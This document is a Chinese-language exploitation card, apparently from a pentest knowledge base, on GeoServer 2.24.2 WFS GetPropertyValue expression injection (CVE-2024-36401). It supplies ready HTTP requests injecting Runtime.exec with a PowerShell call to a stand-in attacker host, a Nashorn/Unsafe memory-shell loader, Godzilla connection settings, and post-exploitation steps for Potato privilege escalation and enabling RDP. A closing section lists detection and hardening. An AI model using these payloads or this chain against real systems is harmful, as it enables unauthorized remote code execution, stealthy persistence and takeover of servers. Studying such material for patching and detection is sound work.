---
id: web-java-component-geoserver-wfs-getpropertyvalue-exec-rce
title: GeoServer 2.24.2 WFS GetPropertyValue 表达式注入 RCE：exec() 执行命令与 defineAnonymousClass 内存马
type: scenario
domain: web
path: web/java/component
technique: geoserver-wfs-getpropertyvalue-expression-rce
aliases:
- GeoServer RCE
- GeoServer WFS GetPropertyValue
- CVE-2024-36401
- OGC 表达式注入
- exec(java.lang.Runtime.getRuntime())
- GeoServer 内存马
- Unsafe defineAnonymousClass
tags:
- geoserver
- java
- wfs
- ogc
- expression-injection
- rce
- memory-shell
- cve-2024-36401
cve:
- CVE-2024-36401
severity: critical
confidence: high
affected_versions: GeoServer 2.24.2（原文首页显示）；CVE-2024-36401 影响 2.25.1/2.24.3/2.23.5 及更早，修复版本 2.25.2/2.24.4/2.23.6
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V241
  verified_at: '2026-11-07T13:10:33+08:00'
  notes: 已对照原文与29张图核对；版本2.24.2、GetPropertyValue exec payload、defineAnonymousClass 内存马与哥斯拉配置均一致；CVE-2024-36401 系按版本与公开 payload 对应公告区间核对后保留（原文未直接给出编号），PoC 未复跑。
---

## 一句话结论

对开启匿名访问的 GeoServer 2.24.2，向 `/geoserver/wfs` 发送 WFS 2.0.0 `GetPropertyValue` 请求，在 `wfs:valueReference` 中注入 `exec(java.lang.Runtime.getRuntime(),'powershell ...')` 即可在服务端执行命令（CVE-2024-36401 类 OGC 表达式注入）；命令执行受服务账户权限限制时可用 PowerShell 反连，随后通过 `eval(getEngineByName(ScriptEngineManager.new(),'js'), ...)` + `sun.misc.Unsafe.defineAnonymousClass` 加载 base64 Java 内存马，获得可交互 Shell。

## 原理

- **入口**：GeoServer 的 WFS 2.0.0 `GetPropertyValue` 会解析 `wfs:valueReference` 作为属性/表达式；当底层 GeoTools 对属性名做表达式求值时，攻击者可以注入 `exec(...)`、`java.lang.Runtime.getRuntime()` 等 Java 方法调用。原文首页显示 `This GeoServer instance is running version 2.24.2`，并启用 `anonymous access to 8 workspaces`，因此无需认证即可访问 WFS。
- **命令执行**：`exec(java.lang.Runtime.getRuntime(),'<command>')` 调用 `Runtime.exec`；原文先测试 `powershell -Command "wget http://attacker"`，在攻击者 `python3 -m http.server` 上看到来自 172.23.23.55 的 GET，确认反连成功。
- **权限限制**：直接 `cmd` 时报 `java.io.IOException: Cannot run program "cmd": CreateProcess error=5, 拒绝访问`，说明 GeoServer 服务账户/沙箱限制了 `cmd.exe`；换成 PowerShell 或其它可执行文件即可绕过该限制。
- **内存马**：用 `eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'), '<JS>')` 在 Nashorn 中执行 JS；JS 里 `var str="<base64>"` 是 Java 类的字节码，先 `sun.misc.BASE64Decoder`/`java.util.Base64` 解码，再用 `sun.misc.Unsafe.defineAnonymousClass(Class.forName("java.lang.Class"), bt, null).newInstance()` 定义并实例化，实现不落盘的内存 Filter/Servlet。原文用哥斯拉 `JavaDynamicPayload` + `JAVA_AES_BASE64` 连接 `/geoserver/wfs/`，密码/密钥为 `1`/`Iotqgktaxj`。
- **为什么成立**：GeoServer 把用户可控的属性名交给表达式引擎求值，表达式引擎又允许调用任意 Java 方法；匿名访问把攻击面直接暴露在未认证入口。内存马利用 `Unsafe.defineAnonymousClass` 在已有类加载器上下文中定义类，绕过文件写入与部分静态检测。
- **后续**：拿到 Shell 后用 BadPotato 等 Potato 系列在 `SeImpersonatePrivilege` 下提权到 SYSTEM，修改注册表开启 RDP，再用 DPAPI 解出的 Administrator 密码登录读 flag。

## 触发条件

- GeoServer 版本在受影响范围（原文 2.24.2），WFS 服务开启；若未开启匿名访问，则需要任意有效账号或其它未授权入口。
- `/geoserver/wfs` 可从攻击者网络访问，`GetPropertyValue` 未被 WAF/代理拦截。
- 目标 JVM 允许表达式引擎调用 Java 方法（默认 GeoTools 行为），且 `exec` 所需命令/程序可执行；`cmd` 被拒时可换 PowerShell/其它二进制。
- 需要内存马时，目标为 Java 8/11 等支持 Nashorn 与 `sun.misc.Unsafe` 的环境（高版本 JDK 可能移除 Nashorn/限制 Unsafe）。
- 目标能出网（反连/下载）或攻击者能通过其它通道回显。

## 利用步骤

1. 访问 `http://target/geoserver/web/`，确认版本（如 2.24.2）与匿名访问工作区。
2. 构造 WFS `GetPropertyValue` 请求，在 `valueReference` 中注入 `exec(java.lang.Runtime.getRuntime(),'powershell -Command "wget http://attacker/"')`；在攻击者侧起 HTTP 服务观察反连。
3. 若 `cmd` 报 `CreateProcess error=5`，改用 PowerShell、`certutil`、`bitsadmin` 等可执行程序，或直接执行 PowerShell 反弹/下载。
4. 准备内存马：生成 Java 内存马类（Godzilla/Behinder），base64 编码；构造 JS 负载：`var str="<base64>"; ...; unsafe.defineAnonymousClass(Class.forName("java.lang.Class"), bt, null).newInstance();`
5. 把 JS 放入 `eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'), '<JS>')`，作为 `valueReference` 发送；观察响应/日志确认类定义成功。
6. 用 Shell 管理器连接 `http://target/geoserver/wfs/`，选择 `JavaDynamicPayload` + `JAVA_AES_BASE64`，填写密码/密钥；确认可执行命令。
7. 后渗透：上传 BadPotato/GodPotato 等，利用 `SeImpersonatePrivilege` 提权；修改 `Terminal Server` 注册表开启 RDP，添加用户或使用已有管理员凭据登录。
8. 清理内存马/上传文件，记录请求与命令输出作为证据。

## PoC

命令执行请求（原文）：

```http
POST /geoserver/wfs HTTP/1.1
Host: 172.23.23.55
Content-Type: application/xml
Content-Length: 368

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>
    exec(java.lang.Runtime.getRuntime(),'powershell -Command "wget http://attacker/"')
  </wfs:valueReference>
</wfs:GetPropertyValue>
```

内存马请求骨架（base64 类体从略，替换为实际 Java 内存马）：

```http
POST /geoserver/wfs HTTP/1.1
Host: 172.23.23.55
Content-Type: application/xml

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="<BASE64_JAVA_CLASS>";
var bt;
try { bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str); }
catch (e) { bt = java.util.Base64.getDecoder().decode(str); }
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>
```

Shell 管理器配置（原文）：URL `http://172.23.23.55/geoserver/wfs/`，密码 `1`，密钥 `Iotqgktaxj`，载荷 `JavaDynamicPayload`，加密器 `JAVA_AES_BASE64`。

说明：原文的 Java 内存马 base64 类体约 17KB，卡片不复制；需用哥斯拉/冰蝎生成对应 payload。`cmd` 被拒时改用 PowerShell；未在本机执行。

## 变体与关联

- 变体：`exec` 可换成其它 Java 方法调用/反射链（如 `java.lang.ProcessBuilder`），或使用 `GetMap` SLD 注入（GeoServer 另一类 OGC 表达式/XXE 入口，见关联卡）。
- 变体：内存马可换成 Behinder/Godzilla 的 Filter/Servlet/Listener 型；JDK 高版本无 Nashorn 时需换 ScriptEngine 或直接反射加载。
- 变体：命令执行被服务账户限制时，可用 PowerShell、`certutil`、`mshta`、`rundll32` 等白名单二进制；或先写内存马再用其上传工具。
- 关联：[[web-generic-xxe-geoserver-wms-getmap-sld]]（GeoServer WMS GetMap SLD 的 XXE/表达式入口）、[[pentest-privilege-escalation-data-drive-acl-iis-webshell-godpotato]]（Potato 系列提权与内存加载）、[[pentest-c2-blockdlls-block-non-ms-dll-edr-injection]]（EDR 规避背景）。
- 边界：GeoServer 升级到修复版本、关闭匿名访问、WAF 拦截 `exec(`/`java.lang.Runtime`、JVM 禁用 Nashorn/Unsafe、或服务账户无出网/执行权限时，本链失败或需要换入口。

## 检测与防御

- 检测：`/geoserver/wfs` 请求体中出现 `GetPropertyValue` + `valueReference` + `exec(`/`java.lang.Runtime`/`ProcessBuilder`；匿名访问 WFS；响应异常/进程创建；GeoServer 服务账户启动 `powershell`/`cmd`/`certutil`；`defineAnonymousClass` 相关内存马特征（无文件 Filter/Servlet、异常类加载）。
- 防御：升级 GeoServer 到修复版本（2.25.2/2.24.4/2.23.6 及以上）；关闭不必要的匿名访问与 WFS；在反向代理/WAF 对 OGC XML 做严格白名单，拒绝表达式/方法调用；限制 GeoServer 服务账户权限与出网。
- 加固：JVM 禁用 Nashorn、限制 `sun.misc.Unsafe`；对 Java 进程做内存马扫描（Filter/Servlet/Listener 链、异常类加载）；监控 `/geoserver` 异常请求与子进程。
- 响应：发现内存马后重启 GeoServer/清理类加载、轮换凭据、检查横向与持久化；审计同时间段 WFS 请求与出网连接。
